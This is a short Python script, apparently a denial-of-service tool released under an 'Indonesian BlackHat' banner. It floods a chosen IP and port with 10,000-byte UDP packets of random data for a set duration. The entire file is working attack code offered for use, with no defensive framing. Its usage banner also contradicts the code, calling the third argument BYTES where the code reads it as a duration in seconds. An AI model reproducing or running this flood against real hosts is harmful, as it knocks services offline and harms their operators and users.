import time  
import socket  
import random  
import sys  

class bcolors:  
    HEADER = '\033[95m'  
    BIRU = '\033[94m'  
    IJO = '\033[92m'  
    KUNING = '\033[93m'  
    FAIL = '\033[91m'  
    ENDC = '\033[0m'  
    BOLD = '\033[1m'  
    UNDERLINE = '\033[4m'  
    ABANG = '\033[31m'  

def usage():  
    print(f"""  
{bcolors.IJO}  
 ____  _           _     _              _       _ _  
|  _ \| |   ___ | | (_)  _\\_/ /_  | | ___ (_) |_   
|  /| | | | (_) | |_) | | (_| |/  \| |_) | | |_ |  
|_|   |_| |_\\___/|_./|_|\\__,/_/\\_\\ ./|_|\\___/|_|\|  
                                     |_|  
{bcolors.IJO}-------------------------------{bcolors.BOLD}{bcolors.ABANG}Indonesian BlackHat{bcolors.ENDC}-------------------------------  

                                  {bcolors.BOLD}{bcolors.KUNING}Author:{bcolors.FAIL}{bcolors.ABANG}./Tsuki{bcolors.ABANG}  

                                 {bcolors.ABANG}Thanks {bcolors.IJO}and {bcolors.BIRU}Greetz {bcolors.KUNING}to:  
                        {bcolors.BIRU}//SiWanna{bcolors.IJO}//D3w1 4qu4{bcolors.KUNING}//Ms.Takyun{bcolors.BIRU}{bcolors.HEADER}//Mr.cay//  
                    {bcolors.ABANG}//All Member {bcolors.KUNING}PhobiaXploit {bcolors.IJO}And NostalgiaXploit//  
{bcolors.IJO}----------------------------------{bcolors.IJO}Pemakaian----------------------------------  
                                   >>DDOS TOOLS<<  
{bcolors.BIRU}{bcolors.HEADER}[*]{bcolors.IJO} Bluebook.py {bcolors.KUNING}Ip {bcolors.ABANG}PORT {bcolors.BIRU}BYTES  
{bcolors.BIRU}>>{bcolors.IJO}IP {bcolors.KUNING}[wajib Pake IP Yak Mas Bro]  
{bcolors.BIRU}>>{bcolors.IJO}PORT {bcolors.KUNING}[Default: 80]  
{bcolors.BIRU}>>{bcolors.IJO}BYTES {bcolors.KUNING}[Data Yang Dikirim Contoh:20000]  
{bcolors.ENDC}  
""")  

def flood(target, port, duration):  
    try:  
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
        bytes = random._urandom(10000)  # 10000 bytes of random data  
        timeout = time.time() + duration  
        sent = 0  

        while True:  
            if time.time() > timeout:  
                break  
            client.sendto(bytes, (target, port))  
            sent += 1  
            print(f"{bcolors.HEADER}[{bcolors.BIRU}*{bcolors.HEADER}] BYTES / DETIK [{bcolors.IJO}{sent}{bcolors.HEADER}] KE [{bcolors.FAIL}{target}{bcolors.HEADER}] PORT [{bcolors.BIRU}{port}{bcolors.HEADER}]")  
    except Exception as e:  
        print(f"{bcolors.FAIL}Error: {e}{bcolors.ENDC}")  
        client.close()  

def main():  
    if len(sys.argv) != 4:  
        usage()  
        print(f"{bcolors.FAIL}Usage: {bcolors.IJO}python {sys.argv[0]} <IP> <PORT> <DURATION>{bcolors.ENDC}")  
    else:  
        target = sys.argv[1]  
        port = int(sys.argv[2])  
        duration = int(sys.argv[3])  
        flood(target, port, duration)  

if __name__ == '__main__':  
    
    main()  